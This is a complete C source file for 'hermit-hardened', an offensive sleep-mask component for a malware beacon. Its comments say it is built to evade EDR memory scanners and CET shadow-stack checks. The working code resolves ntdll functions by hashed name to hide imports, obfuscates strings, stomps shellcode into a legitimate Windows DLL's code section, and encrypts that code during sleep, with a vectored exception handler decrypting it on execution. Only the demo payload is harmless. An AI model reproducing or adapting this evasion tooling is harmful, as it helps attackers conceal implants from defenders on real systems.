// x86_64-w64-mingw32-gcc -O2 -s -nostdlib -ffreestanding \
//   -fno-asynchronous-unwind-tables -fno-stack-protector -fno-ident \
//   -Wl,--entry=hermit_main -Wl,--subsystem,console \
//   -Wl,--dynamicbase -Wl,--nxcompat -Wl,--high-entropy-va \
//   -Wl,--build-id=none -o hermit-hardened.exe hermit-hardened.c
//
// hermit-hardened: a CET-native sleep mask.
//
// Ekko, Cronos, FOLIAGE, SleepyCrypt, Dream, Zilean all drive the mask
// cycle by stomping the stack: ROP, NtContinue with crafted contexts,
// fiber swaps, APC callbacks, timer-queue chains. CET shadow stacks
// (user-mode, 24H2+, Tiger Lake / Zen 3+) check every ret against the
// hardware mirror and kill the process on mismatch. Every one of those
// techniques produces a return path with no matching shadow-stack entry.
//
// hermit doesn't fight CET. The beacon rets cleanly out of the region
// before it sleeps; while cold, no frame on this thread points into
// the region. On wake the call into the NOACCESS page pushes a return
// onto both stacks and then DEP-faults on the fetch. The VEH decrypts,
// the CPU retries, the retried instruction is the decrypted ret, and
// both stacks pop in balance. Balanced call/ret pair, DEP fault in the
// middle. Nothing to reconcile.
//
// The contract is one line:
//
//     call in -> ret out -> signal cold -> sleep
//
// A payload that doesn't return wedges here and the masker never fires.
//
// Scope: aimed at memory scanners (Moneta, pe-sieve, EDR runtime scans),
// not a human doing RE. The DJB2 constants and the *33+c loop are
// trivially reversible in a decompiler; what disappears is the string
// match, the import table, the private-RX region shape, and any stack
// frame or shadow-stack mismatch during sleep.
//
// Residuals this design does not fix:
//   VEH is still enumerable via RtlpVectoredHandlerList.
//   thread_beacon's frame is in our .text while it's parked in
//   NtDelayExecution; Hunt-Sleeping-Beacons catches that. Stack
//   spoofing during sleep is a separate contribution.
//   Stomped bytes don't match xpsservices.dll's on-disk page.

#include <windows.h>
#include <intrin.h>

typedef long NTSTATUS;
#define NTOK(x) ((NTSTATUS)(x) >= 0)
#define PH_CURPROC ((HANDLE)(LONG_PTR)-1)
#define EV_SYNC 1

typedef struct { USHORT L, M; PWSTR B; } ustr_t;

typedef NTSTATUS (NTAPI *fnLdrLoadDll)(PWSTR, PULONG, ustr_t*, PVOID*);
typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *fnNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *fnNtCreateEvent)(PHANDLE, ACCESS_MASK, void*, DWORD, BOOLEAN);
typedef NTSTATUS (NTAPI *fnNtSetEvent)(HANDLE, PLONG);
typedef NTSTATUS (NTAPI *fnNtQuerySystemTime)(PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, void*, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, void*);
typedef NTSTATUS (NTAPI *fnNtQueryPerformanceCounter)(PLARGE_INTEGER, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *fnNtTerminateProcess)(HANDLE, NTSTATUS);
typedef PVOID (NTAPI *fnRtlAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
typedef PVOID (NTAPI *fnRtlAllocateHeap)(PVOID, ULONG, SIZE_T);

static struct {
    fnLdrLoadDll LdrLoad;
    fnNtProtectVirtualMemory ProtectVM;
    fnNtAllocateVirtualMemory AllocVM;
    fnNtWaitForSingleObject Wait;
    fnNtDelayExecution Delay;
    fnNtCreateEvent CreateEv;
    fnNtSetEvent SetEv;
    fnNtQuerySystemTime QueryTime;
    fnNtCreateThreadEx CreateThr;
    fnNtQueryPerformanceCounter QueryPerf;
    fnNtTerminateProcess TermProc;
    fnRtlAddVectoredExceptionHandler AddVEH;
    fnRtlAllocateHeap HeapAlloc;
    PVOID Heap;
} api;

// DJB2 of the lowercased export name. No API strings ship with the binary.
#define H_NTDLL                             0x22d3b5edu
#define H_LdrLoadDll                        0x23a21f83u
#define H_NtProtectVirtualMemory            0x191ec748u
#define H_NtAllocateVirtualMemory           0xc66d2fccu
#define H_NtWaitForSingleObject             0x5b5856dcu
#define H_NtDelayExecution                  0x888318aau
#define H_NtCreateEvent                     0x64135cddu
#define H_NtSetEvent                        0x50e48df5u
#define H_NtQuerySystemTime                 0x3b9712f1u
#define H_NtCreateThreadEx                  0x41f2b1b0u
#define H_NtQueryPerformanceCounter         0x8b5abf0fu
#define H_NtTerminateProcess                0xffb4438fu
#define H_RtlAddVectoredExceptionHandler    0xfab53c49u
#define H_RtlAllocateHeap                   0x481e723au

// Minimal shapes for the PEB loader walk on x64.
typedef struct _ml { struct _ml *F, *B; } ml_t;
typedef struct { USHORT L, M; wchar_t *B; } mu_t;
typedef struct {
    ml_t InLoad, InMem, InInit;
    void *DllBase;
    void *EntryPoint;
    ULONG SizeOfImage;
    mu_t FullName, BaseName;
} mldr_t;
typedef struct {
    ULONG Length;
    BOOLEAN Initialized;
    void *SsHandle;
    ml_t InLoad;
} mldrd_t;
typedef struct {
    BYTE p1[0x18];
    mldrd_t *Ldr;
    void *_pp;
    void *_ssd;
    void *ProcessHeap;
} mpeb_t;

static unsigned int djb2a_w(const wchar_t *w, int wlen_chars) {
    unsigned int h = 5381u;
    for (int i = 0; i < wlen_chars; i++) {
        unsigned char c = (unsigned char)(w[i] & 0xFF);
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

static unsigned int djb2a_a(const char *s) {
    unsigned int h = 5381u;
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

static void *find_mod(unsigned int target) {
    mpeb_t *peb = (mpeb_t*)__readgsqword(0x60);
    ml_t *h = &peb->Ldr->InLoad;
    for (ml_t *e = h->F; e != h; e = e->F) {
        mldr_t *m = (mldr_t*)e;
        if (!m->BaseName.B) continue;
        if (djb2a_w(m->BaseName.B, m->BaseName.L >> 1) == target) return m->DllBase;
    }
    return 0;
}

static void *find_proc(void *mod, unsigned int target) {
    BYTE *b = (BYTE*)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)b;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(b + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *dd = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->VirtualAddress) return 0;
    IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY*)(b + dd->VirtualAddress);
    DWORD *nms = (DWORD*)(b + ed->AddressOfNames);
    DWORD *fns = (DWORD*)(b + ed->AddressOfFunctions);
    WORD *ords = (WORD*)(b + ed->AddressOfNameOrdinals);
    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        if (djb2a_a((char*)(b + nms[i])) == target) return b + fns[ords[i]];
    }
    return 0;
}

// All APIs from ntdll: nothing in kernel32 or bcrypt, so the IAT stays empty.
static int resolve_apis(void) {
    void *n = find_mod(H_NTDLL);
    if (!n) return 0;
    api.LdrLoad = (fnLdrLoadDll)find_proc(n, H_LdrLoadDll);
    api.ProtectVM = (fnNtProtectVirtualMemory)find_proc(n, H_NtProtectVirtualMemory);
    api.AllocVM = (fnNtAllocateVirtualMemory)find_proc(n, H_NtAllocateVirtualMemory);
    api.Wait = (fnNtWaitForSingleObject)find_proc(n, H_NtWaitForSingleObject);
    api.Delay = (fnNtDelayExecution)find_proc(n, H_NtDelayExecution);
    api.CreateEv = (fnNtCreateEvent)find_proc(n, H_NtCreateEvent);
    api.SetEv = (fnNtSetEvent)find_proc(n, H_NtSetEvent);
    api.QueryTime = (fnNtQuerySystemTime)find_proc(n, H_NtQuerySystemTime);
    api.CreateThr = (fnNtCreateThreadEx)find_proc(n, H_NtCreateThreadEx);
    api.QueryPerf = (fnNtQueryPerformanceCounter)find_proc(n, H_NtQueryPerformanceCounter);
    api.TermProc = (fnNtTerminateProcess)find_proc(n, H_NtTerminateProcess);
    api.AddVEH = (fnRtlAddVectoredExceptionHandler)find_proc(n, H_RtlAddVectoredExceptionHandler);
    api.HeapAlloc = (fnRtlAllocateHeap)find_proc(n, H_RtlAllocateHeap);
    mpeb_t *peb = (mpeb_t*)__readgsqword(0x60);
    api.Heap = peb->ProcessHeap;
    return api.LdrLoad && api.ProtectVM && api.AllocVM
        && api.Wait && api.Delay && api.CreateEv && api.SetEv
        && api.QueryTime && api.CreateThr && api.QueryPerf && api.TermProc
        && api.AddVEH && api.HeapAlloc && api.Heap;
}

// xorshift64, used only for sleep jitter. Key material comes from RDRAND.
static unsigned long long g_prng_jit;

static unsigned int rng32(unsigned long long *s) {
    unsigned long long x = *s;
    x ^= x << 23;
    x ^= x >> 17;
    x ^= x << 5;
    *s = x;
    return (unsigned int)x;
}

static unsigned long long seed(void) {
    unsigned long long s = (unsigned long long)__rdtsc();
    LARGE_INTEGER t = { .QuadPart = 0 }, p = { .QuadPart = 0 }, f = { .QuadPart = 0 };
    api.QueryTime(&t);
    api.QueryPerf(&p, &f);
    s ^= (unsigned long long)t.QuadPart;
    s ^= (unsigned long long)p.QuadPart << 11;
    s ^= (unsigned long long)(uintptr_t)&s;
    s ^= (unsigned long long)(uintptr_t)&api;
    if (s == 0) s = 1;
    return s;
}

// Inline-asm RDRAND. No CPUID check, no compiler flag, no runtime library.
// Returns 1 and writes *out on success, 0 after 10 failed retries.
static int rdrand64(unsigned long long *out) {
    for (int t = 0; t < 10; t++) {
        unsigned long long v;
        unsigned char ok;
        __asm__ volatile ("rdrand %0; setc %1"
                          : "=r"(v), "=qm"(ok)
                          :: "cc");
        if (ok) { *out = v; return 1; }
    }
    return 0;
}

static __attribute__((noreturn)) void die(void) {
    api.TermProc(PH_CURPROC, (NTSTATUS)0xC000026Fu);  // STATUS_INVALID_STATE_TRANSITION
    __builtin_unreachable();
}

static void gen_random(unsigned char *out, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i += 8) {
        unsigned long long v;
        if (!rdrand64(&v)) die();
        SIZE_T n = (len - i < 8) ? (len - i) : 8;
        for (SIZE_T j = 0; j < n; j++)
            out[i + j] = (unsigned char)(v >> (j * 8));
    }
}

typedef struct {
    unsigned char *base;   // our shellcode in a stomped MEM_IMAGE page
    SIZE_T len;
    unsigned char *pad;    // per-cycle pad, same length as base
    SIZE_T pad_len;
} region_t;

typedef struct {
    DWORD sleep_ms;
    DWORD jitter_ms;
    DWORD min_sleep_ms;
    int coverage_n;
    int wake_on_demand;
} cfg_t;

static cfg_t g_cfg;

// Descriptor on heap; the global is (ptr ^ cookie). Both cookie and
// pointer are masked to canonical user-mode width (bits 48-63 == 0)
// so the top of g_desc_obf doesn't leak the cookie's high bits through
// x64 address canonicalization.
#define CANON_USER_MASK 0x0000FFFFFFFFFFFFULL
static unsigned long long g_desc_obf, g_cookie;
#define DESC() ((region_t*)(uintptr_t)(g_desc_obf ^ g_cookie))

static volatile LONG g_state = 0;      // 0 plain+RX, 1 masked, 2 decrypting, 3 masking
static volatile DWORD g_sleep_actual;
static HANDLE g_evt_sleep;

static int prot_flip(void *base, SIZE_T len, ULONG p) {
    PVOID b = base; SIZE_T n = len; ULONG old;
    return NTOK(api.ProtectVM(PH_CURPROC, &b, &n, p, &old));
}

// Load xpsservices.dll (XPS printing stack, present on every Windows
// 10/11 image, essentially never used in a non-UI process) and overwrite
// the start of its first .text section. The region is now MEM_IMAGE:
// loader-listed, disk-pathed, nothing a private-RX or unbacked-mapped
// rule catches. The residual IOC is ModifiedModule, which legitimate
// inline hooks produce too.
//
// For a 1-byte demo payload, byte zero of the first function is cold on
// a fresh load. Real build: pick slack in 0xCC alignment runs between
// functions so the hosted code's prologue stays intact.
static int stomp(region_t *r, const unsigned char *sc, SIZE_T sclen) {
    // Per-character stack stores let -O2 recognize a wide-string
    // literal and lower it to wcsncpy from .rdata, which puts
    // "xpsservices.dll" back in the binary as a greppable UTF-16LE
    // string. Store it XOR'd and un-XOR through a volatile key so the
    // compiler can't fold back to plaintext.
    //                       x    p    s    s    e    r    v    i
    //                       c    e    s    .    d    l    l    \0
    static const unsigned char nmx[32] = {
        0x22,0x5A, 0x2A,0x5A, 0x29,0x5A, 0x29,0x5A,
        0x3F,0x5A, 0x28,0x5A, 0x2C,0x5A, 0x33,0x5A,
        0x39,0x5A, 0x3F,0x5A, 0x29,0x5A, 0x74,0x5A,
        0x3E,0x5A, 0x36,0x5A, 0x36,0x5A, 0x5A,0x5A,
    };
    volatile unsigned char kv = 0x5A;
    WCHAR nm[16];
    unsigned char *np = (unsigned char*)nm;
    for (int i = 0; i < 32; i++) np[i] = nmx[i] ^ kv;
    ustr_t us = { .L = 15 * 2, .M = 16 * 2, .B = nm };
    PVOID mod = 0;
    NTSTATUS st = api.LdrLoad(0, 0, &us, &mod);
    // Loader keeps its own copy in PEB.LDR_DATA; don't leave ours.
    for (int i = 0; i < 16; i++) ((volatile WCHAR*)nm)[i] = 0;
    if (!NTOK(st) || !mod) return 0;

    BYTE *b = (BYTE*)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)b;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(b + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
        if (s->Misc.VirtualSize < sclen) continue;
        BYTE *target = b + s->VirtualAddress;
        if (!prot_flip(target, sclen, PAGE_READWRITE)) return 0;
        for (SIZE_T j = 0; j < sclen; j++) target[j] = sc[j];
        // Leave RW; mask_region fires next and takes it RW -> NOACCESS,
        // so no RX plaintext window between stomp and first mask.
        r->base = target;
        r->len = sclen;
        return 1;
    }
    return 0;
}

// The pad is its own MEM_PRIVATE region, same size as the shellcode.
// Starts RW so make_region can seed it; from the first mask onward it
// moves in lockstep with base: both NOACCESS while cold, both briefly
// writable only during the mask/decrypt critical section.
static int alloc_pad(region_t *r, SIZE_T sclen) {
    PVOID pad = 0;
    SIZE_T plen = sclen;
    if (!NTOK(api.AllocVM(PH_CURPROC, &pad, 0, &plen,
                          MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
        return 0;
    r->pad = (unsigned char*)pad;
    r->pad_len = plen;
    return 1;
}

static void xor_region(region_t *r) {
    for (SIZE_T i = 0; i < r->len; i++) r->base[i] ^= r->pad[i];
}

// Publish state=3 BEFORE the page stops being executable, so the VEH
// never sees "state==0 but page is already not RX" and spin.
static void mask_region(region_t *r) {
    if (!prot_flip(r->pad, r->pad_len, PAGE_READWRITE)) die();
    gen_random(r->pad, r->pad_len);
    InterlockedExchange(&g_state, 3);
    if (!prot_flip(r->base, r->len, PAGE_READWRITE)) die();
    xor_region(r);
    if (!prot_flip(r->base, r->len, PAGE_NOACCESS)) die();
    if (!prot_flip(r->pad, r->pad_len, PAGE_NOACCESS)) die();
    InterlockedExchange(&g_state, 1);
}

// Flip to EXECUTE_READ happens last, after the pad is zeroed and
// locked back down. Any flip failure is unrecoverable (state=0 would
// decouple from "region is actually RX") so we die instead of leaving
// the invariant lying to the VEH.
static void decrypt_region(region_t *r) {
    if (!prot_flip(r->pad, r->pad_len, PAGE_READWRITE)) die();
    if (!prot_flip(r->base, r->len, PAGE_READWRITE)) die();
    xor_region(r);
    // volatile keeps -O2 from eliding the zero.
    for (volatile unsigned char *p = r->pad; p < r->pad + r->pad_len; p++) *p = 0;
    if (!prot_flip(r->pad, r->pad_len, PAGE_NOACCESS)) die();
    if (!prot_flip(r->base, r->len, PAGE_EXECUTE_READ)) die();
    InterlockedExchange(&g_state, 0);
}

// On wake, `call rax` architecturally pushes to both the regular and
// shadow stacks before the first instruction at rax is fetched. That
// fetch raises #PF (DEP, access==8) because the target is NOACCESS.
// The pushes are already retired; we arrive here with RIP == r->base
// and matching entries on both stacks. Decrypt, return
// CONTINUE_EXECUTION, let the CPU retry the fetch (now readable) and
// run the decrypted ret, which pops both stacks together. Same call,
// same return address, no mismatch.
//
// A reader hitting NOACCESS stays failed: we never want an in-process
// scanner forcing a decrypt by touching the region.
static LONG CALLBACK veh(PEXCEPTION_POINTERS ei) {
    if (ei->ExceptionRecord->ExceptionCode != (DWORD)EXCEPTION_ACCESS_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;
    region_t *r = DESC();
    unsigned char *addr = (unsigned char*)ei->ExceptionRecord->ExceptionInformation[1];
    if (addr < r->base || addr >= r->base + r->len)
        return EXCEPTION_CONTINUE_SEARCH;
    ULONG_PTR access = ei->ExceptionRecord->ExceptionInformation[0];
    if (access != 8) return EXCEPTION_CONTINUE_SEARCH;
    // Four states, CAS-observed; we yield here rather than re-fault,
    // since exception storms are their own heuristic:
    //   0 plain RX     — decrypt landed
    //   1 masked       — own the decrypt via CAS 1->2
    //   2 decrypting   — someone else owns it; wait
    //   3 masking      — mask in flight; wait for it to finish
    for (;;) {
        LONG s = InterlockedCompareExchange(&g_state, 0, 0);
        if (s == 1) {
            if (InterlockedCompareExchange(&g_state, 2, 1) == 1) {
                decrypt_region(r);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            continue;
        }
        if (s == 0) return EXCEPTION_CONTINUE_EXECUTION;
        LARGE_INTEGER d = { .QuadPart = 0 };
        api.Delay(FALSE, &d);
    }
}

// One iteration per beacon sleep. coverage_n and jitter keep the
// NtProtect cadence from being strictly periodic; coverage_n defaults
// to 1 so every sleep is masked, and the knob stays as a benchmark lever.
static DWORD WINAPI thread_masker(LPVOID p) {
    (void)p;
    region_t *r = DESC();
    LONG cycle = 0;
    for (;;) {
        api.Wait(g_evt_sleep, FALSE, 0);
        LONG c = InterlockedIncrement(&cycle);
        DWORD sa = g_sleep_actual;
        if (sa >= g_cfg.min_sleep_ms && c % g_cfg.coverage_n == 0) {
            mask_region(r);
            if (!g_cfg.wake_on_demand) {
                DWORD margin = sa > 100 ? sa - 100 : 0;
                LARGE_INTEGER d = { .QuadPart = -(LONGLONG)margin * 10000 };
                api.Delay(FALSE, &d);
                if (InterlockedCompareExchange(&g_state, 2, 1) == 1)
                    decrypt_region(r);
            }
        }
    }
    return 0;
}

// Beacon: call in -> ret out -> signal cold -> sleep.
//
// While it's in NtDelayExecution the RIP is in ntdll, the stack is
// clean, and nothing was unwound or spoofed. Shadow stack has no
// mismatch because we never produced one. On wake, the loop's call is
// the wake touch and the VEH handles the DEP fault in the middle.
static DWORD WINAPI thread_beacon(LPVOID p) {
    (void)p;
    region_t *r = DESC();
    for (;;) {
        ((void(*)(void))r->base)();
        DWORD ms = g_cfg.sleep_ms + (g_cfg.jitter_ms ? rng32(&g_prng_jit) % g_cfg.jitter_ms : 0);
        g_sleep_actual = ms;
        api.SetEv(g_evt_sleep, 0);
        LARGE_INTEGER d = { .QuadPart = -(LONGLONG)ms * 10000 };
        api.Delay(FALSE, &d);
    }
    return 0;
}

// -nostdlib doesn't give GCC its own lowerings for struct inits,
// zeroing, or small copies, so provide them.
void *memcpy(void *d, const void *s, size_t n) {
    unsigned char *dd = (unsigned char*)d;
    const unsigned char *ss = (const unsigned char*)s;
    while (n--) *dd++ = *ss++;
    return d;
}

void *memset(void *d, int c, size_t n) {
    unsigned char *dd = (unsigned char*)d;
    while (n--) *dd++ = (unsigned char)c;
    return d;
}

void hermit_main(void) {
    if (!resolve_apis()) __builtin_trap();

    g_cfg.sleep_ms = 2000;
    g_cfg.jitter_ms = 4000;
    g_cfg.min_sleep_ms = 0;
    g_cfg.coverage_n = 1;
    g_cfg.wake_on_demand = 1;
    if (g_cfg.coverage_n < 1) g_cfg.coverage_n = 1;

    g_prng_jit = seed();
    unsigned long long ck;
    if (!rdrand64(&ck)) die();
    g_cookie = ck & CANON_USER_MASK;

    region_t *d = (region_t*)api.HeapAlloc(api.Heap, HEAP_ZERO_MEMORY, sizeof(region_t));
    if (!d) die();
    g_desc_obf = ((unsigned long long)(uintptr_t)d & CANON_USER_MASK) ^ g_cookie;

    unsigned char sc[1];
    sc[0] = 0xC3;                                   // demo payload: bare ret
    if (!stomp(d, sc, sizeof sc)) die();
    if (!alloc_pad(d, sizeof sc)) die();
    ((volatile unsigned char*)sc)[0] = 0;           // don't leave a copy on the stack

    // VEH live before the first mask so any fault on the region lands
    // in our handler, not the default top-level one.
    if (!api.AddVEH(1, veh)) die();

    // Mask BEFORE threads start. No plaintext-RX startup window; the
    // beacon's first call will DEP-fault into the VEH.
    mask_region(d);

    HANDLE ev = 0;
    if (!NTOK(api.CreateEv(&ev, EVENT_ALL_ACCESS, 0, EV_SYNC, FALSE)) || !ev)
        die();
    g_evt_sleep = ev;

    HANDLE t1 = 0, t2 = 0;
    if (!NTOK(api.CreateThr(&t1, THREAD_ALL_ACCESS, 0, PH_CURPROC,
                            (LPTHREAD_START_ROUTINE)thread_masker, 0, 0, 0, 0, 0, 0))
        || !t1) die();
    if (!NTOK(api.CreateThr(&t2, THREAD_ALL_ACCESS, 0, PH_CURPROC,
                            (LPTHREAD_START_ROUTINE)thread_beacon, 0, 0, 0, 0, 0, 0))
        || !t2) die();

    LARGE_INTEGER wait = { .QuadPart = -200000000LL };  // 20s demo window
    api.Delay(FALSE, &wait);

    api.TermProc(PH_CURPROC, 0);
    __builtin_unreachable();
}
